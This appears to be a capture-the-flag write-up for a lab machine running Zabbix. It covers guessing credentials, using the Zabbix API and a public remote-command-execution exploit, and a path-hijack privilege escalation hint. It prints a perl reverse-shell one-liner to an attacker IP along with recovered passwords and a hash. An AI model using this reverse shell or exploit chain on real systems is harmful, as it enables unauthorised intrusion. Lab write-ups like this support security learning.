# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings

## External
### Enumeration
![](https://i.imgur.com/5IY5mBx.png)
#### PORT `10050`
![](https://i.imgur.com/kSJu89O.png)
![](https://i.imgur.com/LUxvsPd.png)
![](https://i.imgur.com/uq06ihB.png)
- Signed in as Guest
	- ![](https://i.imgur.com/O4bPLrc.png)
![](https://i.imgur.com/mspanbD.png)
![](https://i.imgur.com/rsiahzI.png)
![](https://i.imgur.com/ZU5Jc3G.png)
- i got nothing. So lets brute force it.
	- This can be username, Because i tried Admin and nothing Come out. `zapper` ![](https://i.imgur.com/7m12T6j.png)
 - ![](https://i.imgur.com/8jCM3PK.png)
	 - ` zapper : zapper `
 - we got the pass and when we try it says we cant access it with GUI... so i can use the tools i got while Enumeration ![](https://i.imgur.com/UziqA0A.png)
![](https://i.imgur.com/VWaqiXq.png)
![](https://i.imgur.com/Mm8v5Ir.png)

```shell
curl -X POST -H "Content-Type: application/json" -d '{
   "jsonrpc": "2.0",
   "method": "user.login",
   "params": {
      "user": "zapper",
      "password": "zapper"
   },
   "id": 1
}' http://10.129.1.198/zabbix/api_jsonrpc.php
```
- This Gave me the token then i used the bellow
```shell
curl -X POST -H "Content-Type: application/json" -d '{
   "jsonrpc": "2.0",
   "method": "host.get",
   "params": {
      "output": ["hostid", "host"],
      "selectInterfaces": ["ip"]
   },
   "auth": "d914103eb5aeb970f1e9ec9dbdbf3a58",
   "id": 1
}' http://10.129.1.198/zabbix/api_jsonrpc.php

{"jsonrpc":"2.0","result":[{"hostid":"10105","host":"Zabbix","interfaces":[{"ip":"127.0.0.1"}]},{"hostid":"10106","host":"Zipper","interfaces":[{"ip":"172.17.0.1"}]}],"id":1}
```
![](https://i.imgur.com/dr8iV1W.png)
![](https://i.imgur.com/i9Wn5Sr.png ) https://packetstormsecurity.com/files/137454/Zabbix-3.0.3-Remote-Command-Execution.html
This Program is Throwing an error. Because of the hostid an now we have it.
it is working now ![](https://i.imgur.com/jzU9afO.png)

### Gaining Access
![](https://i.imgur.com/2TsnRv5.png)
## Internal
### Enumeration
![](https://i.imgur.com/hzUspoG.png)
![](https://i.imgur.com/y6qsaWF.png)
```shell
DBName=zabbixdb
DBUser=zabbix
DBPassword=f.YMeMd$pTbpY3-449
```
cat /run/zabbix/zabbix_server.pid
/var/log/zabbix/zabbix_server.log
![](https://i.imgur.com/NDP9Nn3.png)
65e730e044402ef2e2f386a18ec03c72

```
perl -e 'use Socket;$i="10.10.14.10";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' &
```
### Gaining Access
![](https://i.imgur.com/aAqCYkg.png)
![](https://i.imgur.com/T6sSbYA.png)
![](https://i.imgur.com/sRO3QHO.png)
` zapper : ZippityDoDah `
### Maintaining Access
- using the Zip password i got access![](https://i.imgur.com/uRZlR1e.png)
- ![](https://i.imgur.com/sMLLGQO.png)

- There is Script inside the `~/util`
	- ![](https://i.imgur.com/GE7MHta.png)
it is executing the systemctl in root, but it is not using absolute path
![](https://i.imgur.com/OXoLDbO.png)

![](https://i.imgur.com/b8nECXn.png)

# Random Notes